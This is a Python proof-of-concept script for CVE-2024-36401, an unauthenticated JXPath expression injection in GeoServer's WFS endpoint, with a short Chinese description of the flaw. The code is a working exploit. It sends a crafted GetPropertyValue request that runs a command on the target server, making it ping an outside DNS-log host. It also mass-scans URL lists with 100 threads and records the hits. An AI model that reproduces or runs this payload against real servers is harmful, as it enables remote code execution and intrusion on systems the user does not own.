#Geoserver JXPath表达式注入致远程代码执行漏洞复现(CVE-2024-36401)
#2024年7月，互联网上披露Geoserver表达式注入致远程代码执行漏洞(CVE-2024-36401)，攻击者无需认证即可利用该漏洞获取服务器权限，建议受影响的客户尽快修复漏洞。
#该系统不安全地将属性名称解析为 XPath 表达式。GeoServer 调用的 GeoTools 库 API 以不安全的方式将要素类型的属性名称传递给commons-xpath 库。该库在解析 XPat 表达式时，可以执行仟意代码。这种 XPat 评估本应仅供复杂要素类型(例如应用程序架构数据存储)使用，但由于错误，该机制也被应用于简单要素类型。这使得所有 GeoServer 实例都可能受到该漏洞的影响。
#app="GeoServer"  GeoServer_wfs_RCE_CVE-2024-36401.py
import requests,re,argparse,sys,time,os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()# 解除警告
from colorama import Fore, Style
BLUE = Fore.BLUE
RESET = Style.RESET_ALL
def banner():
    banner ="""

 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░ ▐██▌ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░ ▐██▌ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█  ▐██▌ 
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█  ▓██▒ 
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓  ▒▄▄  
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒   ░▀▀▒ 
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░   ░  ░ 
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░      ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░     ░    
                                    author:           🐖sawa🐇
                                    version:          1.0.0
                                    For:              Geoserver JXPath表达式注入致远程代码执行漏洞
                                    Vulnerability ID: CVE-2024-36401               ░                                                     
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description="this is a Geoserver JXPath表达式注入致远程代码执行Vulnerability")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','-file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")# print("Usage:\n\t python3 {} -h".format(sys.argv[0]))

def poc(target):
    payload_url = '/geoserver/wfs'
    url = target+payload_url
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36',
        'Accept-Encoding':'gzip, deflate, br',
        'Accept': '*/*',
        'Accept-Language':'en-US;q=0.9,en;q=0.8',
        'Connection':'close',
        }
    data = "\r\n<wfs:GetPropertyValue service='WFS' version='2.0.0'\r\nxmlns:topp='http://www.openplans.org/topp'\r\nxmlns:fes='http://www.opengis.net/fes/2.0'\r\nxmlns:wfs='http://www.opengis.net/wfs/2.0'\r\nvalueReference='exec(java.lang.Runtime.getRuntime(),\"ping dnmy0h.dnslog.cn\")'>\r\n<wfs:Query typeNames='topp:states'/>\r\n</wfs:GetPropertyValue>\r\n\r\n"
    try:    
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5)
        if 'xml' in res.text:
            print(f"{BLUE}[+]该{target}存在漏洞{RESET}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")
                return True
        else:
            print(f"[-]该{target}不存在漏洞")
            return False
    except Exception as e:
        print(f"[*]该url存在问题{target}"+str(e))
        return False

if __name__ == '__main__':
    main()








